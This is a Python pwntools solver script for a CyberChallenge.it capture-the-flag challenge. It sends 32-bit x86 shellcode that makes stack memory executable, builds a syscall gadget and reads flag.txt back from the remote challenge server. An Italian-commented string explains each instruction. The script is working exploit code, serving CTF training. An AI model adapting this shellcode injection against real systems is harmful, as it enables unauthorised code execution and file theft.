#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.bits = 32

r = remote('lmrtfy.challs.cyberchallenge.it', 9124)

shellcode = asm("""
    mov eax, esp
    and eax, 0xfffff000
    sub eax, 0x1000

    mov ecx, 0x80490d4
    push 7
    push 0x3000
    push eax
    call ecx
    add esp, 12

    sub esp, 16
    mov byte ptr [esp], 0xcd
    mov byte ptr [esp+1], 0x80
    mov byte ptr [esp+2], 0xc3
    mov edi, esp

    lea ebx, [esp+3]
    mov dword ptr [ebx],   0x67616c66
    mov dword ptr [ebx+4], 0x7478742e
    mov dword ptr [ebx+8], 0x00000000
    mov eax, 5
    xor ecx, ecx
    xor edx, edx
    call edi
    mov esi, eax

    sub esp, 80
    mov ebx, esi
    mov ecx, esp
    mov edx, 64
    mov eax, 3
    call edi

    mov edx, eax
    mov eax, 4
    mov ebx, 1
    call edi
""")

print(f"Shellcode length: {len(shellcode)}")
r.recvuntil(b'run?\n')
r.sendline(shellcode)
r.recvuntil(b'running it...\n')
data = r.recv(2048)
print("Output:", data)

spiegazione = """
from pwn import *

context.arch = 'i386'  # Imposta l'architettura a x86 (32 bit)
context.bits = 32

r = remote('lmrtfy.challs.cyberchallenge.it', 9124) # Si connette al server della sfida


mov eax, esp
and eax, 0xfffff000  ; Allinea l'indirizzo alla pagina di memoria
sub eax, 0x1000      ; Punta a una zona di memoria precedente

mov ecx, 0x80490d4   ; Indirizzo di una funzione (probabilmente mprotect o simile)
push 7               ; Permessi: PROT\_READ | PROT\_WRITE | PROT\_EXEC
push 0x3000          ; Dimensione della memoria da modificare
push eax             ; Indirizzo base
call ecx             ; Chiama la funzione per rendere la memoria eseguibile


sub esp, 16
mov byte ptr [esp], 0xcd    ; Opcode per 'int 0x80' (interrupt di sistema)
mov byte ptr [esp+1], 0x80
mov byte ptr [esp+2], 0xc3  ; Opcode per 'ret' (ritorno)
mov edi, esp                ; Salva l'indirizzo di questo pezzetto in EDI

lea ebx, [esp+3]
mov dword ptr [ebx],   0x67616c66 ; "flag"
mov dword ptr [ebx+4], 0x7478742e ; ".txt"
mov dword ptr [ebx+8], 0x00000000 ; Null terminator

mov eax, 5      ; Syscall numero 5: open()
xor ecx, ecx    ; flags = 0 (O_RDONLY)
xor edx, edx    ; mode = 0
call edi        ; Esegue l'apertura
mov esi, eax    ; Salva il file descriptor (ID del file aperto) in ESI


sub esp, 80     ; Crea spazio sullo stack per il contenuto del file
mov ebx, esi    ; Passa il file descriptor
mov ecx, esp    ; Buffer dove salvare il contenuto
mov edx, 64     ; Leggi 64 byte
mov eax, 3      ; Syscall numero 3: read()
call edi        ; Esegue la lettura


mov edx, eax    ; Numero di byte letti (restituito da read)
mov eax, 4      ; Syscall numero 4: write()
mov ebx, 1      ; file descriptor 1: stdout (il terminale)
call edi        ; Esegue la stampa a video


print(f"Shellcode length: {len(shellcode)}")
r.recvuntil(b'run?\n')      ; Attende che il server sia pronto
r.sendline(shellcode)       ; Invia il codice malevolo
r.recvuntil(b'running it...\n')
data = r.recv(2048)         ; Riceve il risultato (il contenuto di flag.txt)
print("Output:", data)

"""

